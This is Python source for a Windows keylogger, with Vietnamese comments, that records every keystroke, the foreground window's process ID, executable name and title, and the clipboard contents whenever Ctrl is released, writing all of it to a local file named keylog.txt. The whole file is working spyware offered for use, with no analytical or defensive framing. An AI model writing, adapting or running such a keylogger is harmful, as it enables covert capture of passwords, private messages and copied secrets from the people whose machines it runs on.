from pynput import keyboard
import os
import time
import win32clipboard
import ctypes
import logging

# Thiết lập log
log_dir = ""
logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

current_window = None

# Lấy thông tin cửa sổ hiện tại
def get_current_process():
    hwnd = ctypes.windll.user32.GetForegroundWindow()

    pid = ctypes.c_ulong()
    ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))

    executable = ctypes.create_string_buffer(512)
    h_process = ctypes.windll.kernel32.OpenProcess(0x400 | 0x10, False, pid.value)

    ctypes.windll.psapi.GetModuleBaseNameA(h_process, None, ctypes.byref(executable), 512)

    window_title = ctypes.create_string_buffer(512)
    ctypes.windll.user32.GetWindowTextA(hwnd, ctypes.byref(window_title), 512)

    ctypes.windll.kernel32.CloseHandle(hwnd)
    ctypes.windll.kernel32.CloseHandle(h_process)

    logging.info("\n[ PID: %s - %s - %s ]" % (pid.value, executable.value.decode(), window_title.value.decode()))

# Bắt phím
def on_press(key):
    global current_window

    # Nếu đổi cửa sổ thì ghi log cửa sổ mới
    new_window = ctypes.windll.user32.GetForegroundWindow()
    if new_window != current_window:
        current_window = new_window
        get_current_process()

    try:
        logging.info('%s' % key.char)
    except AttributeError:
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        elif key == keyboard.Key.enter:
            logging.info('\n')
        elif key == keyboard.Key.space:
            logging.info(' ')
        elif key == keyboard.Key.tab:
            logging.info('[TAB]')
        elif key == keyboard.Key.backspace:
            logging.info('[BACKSPACE]')
        elif key == keyboard.Key.esc:
            logging.info('[ESC]')
        elif key == keyboard.Key.shift:
            logging.info('[SHIFT]')
        else:
            logging.info('[%s]' % key)

# Bắt tổ hợp Ctrl + V để đọc clipboard
def on_release(key):
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            logging.info('[PASTE] - %s' % pasted_data)
        except Exception:
            pass

# Chạy keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
